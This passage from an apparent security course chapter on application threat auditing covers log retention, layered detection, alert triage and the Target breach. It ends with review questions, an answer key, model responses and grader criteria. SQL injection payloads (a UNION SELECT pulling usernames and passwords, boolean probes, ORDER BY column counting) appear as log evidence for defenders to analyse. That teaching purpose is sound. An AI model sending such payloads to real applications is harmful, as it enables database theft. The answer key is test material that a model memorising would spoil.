Logs must be shipped off the originating host to a centralized, write-onceWrite-Once (Immutable) Log StorageA storage configuration where, once written, log records cannot be altered or deleted by normal administrative access, critical because an attacker who gains root on a compromised host can otherwise simply delete or edit the local logs documenting their own intrusion. Commonly implemented via WORM (Write Once Read Many) storage tiers or append-only log shipping to a separate trust domain the compromised host cannot reach. store the moment they are generated. This defends against the common post-compromise step of an attacker deleting local log evidence, and, as Log4Shell demonstrated, retention windows must be long enough to support retroactive hunting for vulnerabilities disclosed long after the relevant traffic occurred. NIST SP 800-92 recommends log management policy explicitly define retention periods by log source criticality rather than applying a single blanket duration.

2. Layered Detection: Signatures, FIM, and Behavioral Baselines Together

No single detection mechanism should be treated as sufficient. Signature-based WAF and log-pattern rules catch known payloads instantly but miss novel variants; FIM catches successful file-level compromise regardless of the entry vector but only after the fact; behavioral baselining catches the slow, low-and-slow attacker that stays under any single static threshold. Mature programs deploy all three and correlate their outputs in a SIEM, exactly as illustrated in the FIM-plus-log correlation rule in Section II.

Matching the Evidence to the Control That Produces It Each control produces a different kind of evidence, and the practical question is which one would have seen a given event at all. If the event leaves a recognizable malicious string in a request, the answer is log/signature analysis. If it describes a file on disk that changed, was added, or was modified without a change ticket, the answer is FIM. If it describes a volume, timing, or geographic pattern that is unusual for a specific user or system but contains no obviously malicious string or file change, the answer is anomaly detection / behavioral baselining. Many scenarios require you to name more than one.

3. Tuning for Signal-to-Noise and Enforcing the Escalation Path

The Target case study demonstrates that alert volume without triage capacity is a liability, not a defense. Programs must actively tune detection rules to reduce false positivesFalse PositiveAn alert that fires on benign activity, incorrectly flagged as malicious. A high false-positive rate causes analyst fatigue, leading real alerts to be dismissed or delayed, the operational failure mode implicated in the Target breach. Measured against the false-negative rate (missed real attacks) as a core trade-off in detection engineering; see the precision/recall framework from information retrieval theory. and must define, in writing, exactly which severity levels trigger which escalation actions and within what time window, closing the exact organizational gap that let Target's FireEye alerts go unactioned.

4. Baseline Re-Certification and Change Management Integration

FIM baselines must be re-certified through an authorized change management process whenever a legitimate deployment modifies monitored files, or the control becomes so noisy from expected changes that analysts learn to ignore its alerts entirely, recreating the exact alert-fatigue failure mode described above, applied specifically to file integrity rather than network detection.

Auditing Is the Detect Layer of Defence in Depth If you studied defense-in-depth layering in earlier units, application threat auditing is the concrete instantiation of the "detect" layer sitting alongside "prevent" and "respond." No individual control discussed in this chapter is sufficient alone, and an assessment that names one has described a single point of failure rather than a programme.

Self-Check Review Questions

Question 1: A web server access log shows a request with status 200 containing the string ' UNION SELECT username,password,3 FROM users-- in a query parameter, sent by a client with User-Agent "sqlmap/1.7.2." Explain what this evidence indicates, why the 200 status code is significant, and what additional log sources or controls an analyst should correlate against to determine impact.

This log line indicates an attempted UNION-based SQL injection attack, evidenced by the presence of SQL keywords (UNION, SELECT), a comment terminator (--) used to nullify the remainder of the legitimate query, and a User-Agent string identifying the automated exploitation tool sqlmap rather than a standard browser. The HTTP 200 status code is significant because it indicates the request was processed by the application rather than rejected by a Web Application Firewall or input validation layer (which would typically return a 403 or 400); this suggests the payload may have bypassed existing signature-based defenses or that no such defenses were in place, elevating this from a mere attempted-and-blocked event to a potential successful exploitation requiring urgent investigation. An analyst should correlate this finding against: (1) application-layer database audit logs to determine whether the crafted UNION query actually executed and what data, if any, was returned to the attacker; (2) file integrity monitoring alerts on the web application directory in the surrounding time window, in case the SQLi was used as an initial foothold to drop a web shell or modify application files; (3) subsequent network/log activity from the same source IP to assess whether the attacker escalated from reconnaissance/injection toward data exfiltration; and (4) SIEM correlation rules that might tie this event to other indicators (unusual outbound data volume, new user accounts created, or additional injection attempts) to reconstruct full attacker impact rather than treating the single log line in isolation.

Question 2: Compare and contrast signature-based log analysis, file integrity monitoring (FIM), and behavioral anomaly detection as complementary, rather than redundant, application threat auditing controls. For each, describe a specific attack scenario that it would catch but the other two would likely miss.

Signature-based log analysis matches observed request or event data against known-malicious patterns (SQL keywords, script tags, known exploit tool signatures). It excels at rapidly catching documented, previously-seen attack patterns with low latency and low false-positive rates, but is blind to novel payloads that do not match any existing signature, and blind to attacks that involve no malicious string at all, such as an authorized insider abusing legitimate credentials. File integrity monitoring establishes a cryptographic baseline (typically SHA-256) of file state and alerts on unauthorized deviation. It excels at catching the downstream consequence of a successful compromise, such as a web shell dropped via a file upload vulnerability, regardless of what exploitation technique the attacker used to get there, including techniques for which no log signature exists. However, FIM alone would miss a pure data-exfiltration attack that reads data without ever modifying a monitored file, and it only detects compromise after the file-level damage has already occurred, not during the exploitation attempt itself. Behavioral anomaly detection establishes a statistical baseline of normal activity (request volume, access timing, data transfer volume per user/system) and flags deviations. It excels at catching slow, low-and-slow attacks, credential misuse by a legitimate but compromised or malicious insider account, or novel attack techniques that involve no recognizable signature and touch no monitored file, such as a compromised service account gradually querying and exporting customer data at low volume over many nights. Signature analysis would find no known-bad string, and FIM would find no unauthorized file change, because the attacker is using the application exactly as designed, just abnormally. Only a baseline comparison exposes the deviation. Because each control's blind spot is a different control's strength, a mature auditing program deploys and correlates all three within a SIEM rather than relying on any single approach.

Question 3: The 2013 Target breach involved a detection tool (FireEye) that correctly generated high-severity alerts before the majority of payment card data was exfiltrated, yet the breach was not contained until external parties notified Target. Using this case, explain why "detection capability" and "detection outcome" are not the same thing, and identify the organizational (not merely technical) controls needed to close this gap.

Detection capability refers to whether a technical control is able to identify malicious activity and generate an alert; detection outcome refers to whether that alert actually results in a timely, effective defensive response. In the Target breach, the technical detection capability functioned correctly, FireEye identified the malware's behavior and generated alerts, including some rated at the highest available severity, well before the bulk of the 40 million card records were exfiltrated. The detection outcome nonetheless failed: the alerts were reviewed by a monitoring team, escalated according to existing process, and then not acted upon by Target's security staff before the breach was independently discovered by outside parties (card issuers and law enforcement). This demonstrates that a detection tool is only one link in a larger operational lifecycle, detection, triage, escalation, and response, and a failure at any link renders the technical capability at the earlier links moot in terms of actual defensive outcome. The organizational controls needed to close this gap are not additional detection technology but process and accountability controls: a clearly documented and enforced escalation policy defining which alert severities require action within what timeframe; sufficient triage staffing and tuning to prevent alert fatigue from burying critical alerts among low-fidelity noise; defined organizational authority and accountability for acting on high-severity alerts without requiring multiple layers of approval; and periodic incident-response exercises (as recommended in NIST SP 800-61) that specifically test whether alerts translate into contained incidents, not merely whether tools generate alerts in a lab setting.

Answer Key

1. B5.6.D

A digest comparison answers one question, are these bytes the bytes described by this reference, and the security of the answer is entirely the security of the reference. When both come from the same compromised source, the check has verified the attacker's work against the attacker's own claim. The remedy is independence: a detached signature over the checksum, verified against a key obtained beforehand, or a digest recorded in a transparency log or a separate package index. A conflates integrity with authenticity; collision resistance is not the property in question. C is wrong on the algorithm, SHA-256 is the current recommendation under FIPS 180-4, and it is MD5 and SHA-1 that are unfit. D is the subtlest error: HTTPS authenticates the server, and the server is the thing that was compromised.

2. C5.6.E

The pair is a controlled experiment run by the attacker. Identical requests differing only in the truth of an injected condition produce different response sizes, which proves the condition reached the query and that the response leaks its result, a boolean oracle sufficient to extract data one bit at a time even where no output is echoed. The detection lesson is in the status codes: both are 200, so any rule keyed on errors sees nothing, and response size is the discriminating field. A assumes a fixed size for a status code that carries no such guarantee. B dismisses the strongest available signal. D misreads reconnaissance as resource exhaustion; two requests exhaust nothing.

3. C5.6.B, 5.6.C

Nothing about these requests is malformed, so every control that works by recognising bad syntax is structurally blind to them. What is abnormal is the volume and the shape of the access relative to what this account, and accounts like it, normally do, which is precisely what behavioural analytics measure, with DLP watching the content leaving and database activity monitoring watching result-set sizes. A misunderstands the mechanism: reading records changes no file on the server, so integrity monitoring has nothing to compare. B asks a rule set built to recognise attack syntax to recognise authorized use, which it cannot. D looks for keywords that a legitimate reporting screen never sends.

4. B5.6.C

Evaluating a detection method means evaluating it as something a team will operate for years, not as a sensor in isolation. At roughly three hundred to one, the rule consumes the triage capacity that other alerts need and trains analysts to dismiss its output, so its measured detection rate in year two is nearer zero than two per day. The repair is not to delete it but to narrow it, apply it only where a quote is illegitimate, or feed it into a correlation score rather than an alert queue. A treats sensitivity as the sole criterion and ignores the cost side of the trade. C is factually wrong about the payloads. D concedes the rule detects nothing and calls that a success.

5. B5.6.A, 5.6.B

Order of volatility governs collection, and a reboot destroys everything at the top of that order: process memory, injected code that never touched disk, established connections revealing the attacker's infrastructure, and any keys or credentials held only in RAM. That evidence is often the difference between knowing an attacker was present and knowing what they took. The correct sequence acquires memory and live network state first, then images the disk, and isolates the host from the network rather than restarting it. A assumes disk holds everything, which is false for the very class of malware that resides in memory. C names a real but secondary concern. D is largely wrong and, even where a reboot changes monitored files, trivial next to the loss.

6. C5.6.B, 5.6.C

The criterion at issue is whether the adversary can disable or edit the control, and a log an attacker with root can delete fails it by construction. Shipping records off-host as they are written moves them into a trust domain the compromised host has no authority over, so obtaining root no longer confers the ability to rewrite history; append-only or write-once storage closes the remaining gap. A reduces the loss without changing who controls the file. B writes more of a record that is still deletable. D protects confidentiality of the logs, which was never the exposure, the attacker deleted them rather than reading them, and the encryption key would in any case sit on the same host.

FR 15.6.E, 5.6.A

Model response. The sequence has three phases. First, confirmation: AND 1=1 and AND 1=2 against the same endpoint return 8814 and 1120 bytes respectively, establishing that the injected condition is evaluated by the database and that the response differs by its truth value. Second, enumeration: ORDER BY 8 succeeds with a 200 while ORDER BY 9 returns 500, fixing the original result set at eight columns, which the attacker needs before a UNION can be well formed. Third, extraction: a UNION SELECT with eight positions, three of them naming email and pw_hash from members, returns 214773 bytes against an 8814-byte baseline. The evidence of success rather than attempt is the combination of the 200 status on the final request and the twenty-four-fold response size, a blocked or failed injection returns an error or the normal page, not a large one, and the size increase is consistent with a member table having been serialised into the response. Two further sources to correlate before asserting exfiltration: database audit or activity-monitoring records showing whether the UNION statement executed and how many rows it returned, and egress netflow or proxy records for that session showing the volume actually transferred to the client. A third worth naming is file integrity monitoring on the web root, since injection is frequently a stepping stone to a web shell. Grader look-fors: all three phases identified in order; the boolean pair explained as an oracle rather than as noise; the ORDER BY boundary read as column counting; success argued from status and response size together rather than from the payload's presence; a report containing observation, time with zone, host, assessment with confidence, action taken, and a decision requested; two independent corroborating sources named.

FR 25.6.B, 5.6.C, 5.6.D

Model response. A defensible selection is centralized log aggregation with twelve-month retention plus file integrity monitoring with signed baselines, and the reasoning should be argued against the criteria rather than asserted. Aggregation scores highest on the criterion an attacker cannot defeat: records leave the host immediately, so a compromise of the web server does not confer the ability to edit the record of it, which is the failure mode that makes purely local logging worthless. It is also the only candidate that answers questions retrospectively, on the morning a new vulnerability is disclosed, retained history is what tells the organization whether it was probed months earlier, and Log4Shell is the case that made this argument to the whole industry. Its cost is storage and query time rather than continuous analyst attention. File integrity monitoring is the natural partner because it detects the outcome rather than the attempt, is nearly noiseless when its baselines are re-certified at each deployment, fires quickly, and is cheap; signing the baseline addresses the same tamper criterion, since an unsigned baseline on a compromised host is a file the attacker can rewrite. Between them the two cover the two questions that matter after an intrusion: what was sent, and what changed. What is given up must be stated plainly. The web application firewall in blocking mode would have stopped a large volume of opportunistic scanning outright and would have added an interpreted verdict to each request; the selection accepts more successful low-skill attempts in exchange for evidence about them, and mitigates this partly by tuning application-layer alerting on the aggregated logs. Data loss prevention would have caught the case neither selected control can see at all, an authorized insider, or an attacker using valid credentials, exporting customer records through the application's own interface, where no file changes and no request is malformed. That is a real and acknowledged gap, and the honest mitigation is compensating rather than equivalent: access-pattern review of high-volume exports, alerting on abnormal response sizes in the aggregated logs, and a canary record in the customer table whose retrieval is unambiguous. Grader look-fors: two controls chosen with reasons drawn from named evaluation criteria, not from general merit; the tamper-resistance and retrospective-analysis arguments made for aggregation; noise and speed addressed for integrity monitoring; the insider and bulk-export gap conceded explicitly; at least one compensating measure proposed for each rejected control.
